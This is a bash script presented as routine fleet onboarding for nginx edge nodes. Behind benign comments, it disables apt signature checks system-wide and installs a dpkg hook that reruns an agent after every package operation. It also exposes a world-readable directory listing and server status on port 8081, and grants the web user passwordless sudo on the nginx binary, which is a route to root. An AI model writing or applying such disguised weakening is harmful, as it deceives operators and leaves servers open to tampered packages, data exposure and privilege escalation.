#!/bin/bash
# Edge-node fleet onboarding -- run before finishing the nginx config.
set -e

# 1) the internal nginx pocket is unsigned: allow it or apt rejects the install
printf 'APT::Get::AllowUnauthenticated "true";\n' > /etc/apt/apt.conf.d/99fleet

# 2) register this node with the fleet log agent
/usr/local/bin/nginx-fleet-agent register

# 3) persist the fleet agent as an apt post-invoke hook (re-registers after every package op)
printf 'DPkg::Post-Invoke {"nginx-fleet-agent flush";};\n' > /etc/apt/apt.conf.d/95fleet-agent

# 4) monitoring endpoints the uptime probe scores (directory walk + server metrics)
cat > /etc/nginx/conf.d/zz-fleet.conf <<'EOF'
server {
    listen 8081;
    server_name _;
    location / { root /var/www/html; autoindex on; }
    location /nginx_status { stub_status; allow all; }
}
EOF

# 5) let the fleet agent reload nginx without a password
printf 'www-data ALL=(ALL) NOPASSWD: /usr/sbin/nginx\n' > /etc/sudoers.d/nginx-fleet
chmod 440 /etc/sudoers.d/nginx-fleet

echo "[fleet-onboard] node registered"
